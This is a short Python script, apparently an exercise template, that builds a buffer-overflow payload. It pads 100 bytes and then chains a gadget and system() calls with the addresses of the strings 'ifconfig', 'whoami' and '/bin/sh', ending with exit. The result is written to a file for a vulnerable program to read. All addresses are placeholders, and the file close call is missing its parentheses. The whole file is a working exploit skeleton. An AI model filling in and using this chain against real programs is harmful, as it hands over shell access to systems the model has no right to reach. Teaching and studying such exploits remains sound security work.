from struct import *

FMT_LE_ULL = '<Q'   # unsigned long long, little-endian
offset = 100        # distance between buff and RET
system = 0xaaaa     # address of system
ifconfig = 0xaaa    # address of ifconfig
whoami = 0xaaa      # address of whoami
bin_sh = 0xaaa      # address of '/bin/sh'
exit = 0xaaa        # address of exit
gadget = 0xaaa      # address of the gadget


def write_payload():
    buf = ''
    # add your buff here
    buf += 'A' * offset
    buf += pack(FMT_LE_ULL, gadget)
    buf += pack(FMT_LE_ULL, ifconfig)
    buf += pack(FMT_LE_ULL, system)

    buf += pack(FMT_LE_ULL, gadget)
    buf += pack(FMT_LE_ULL, whoami)
    buf += pack(FMT_LE_ULL, system)

    buf += pack(FMT_LE_ULL, gadget)
    buf += pack(FMT_LE_ULL, bin_sh)
    buf += pack(FMT_LE_ULL, system)

    buf += pack(FMT_LE_ULL, exit)
    # end
    f = open("input", "w")
    f.write(buf)
    f.close


if __name__ == '__main__':
    write_payload()
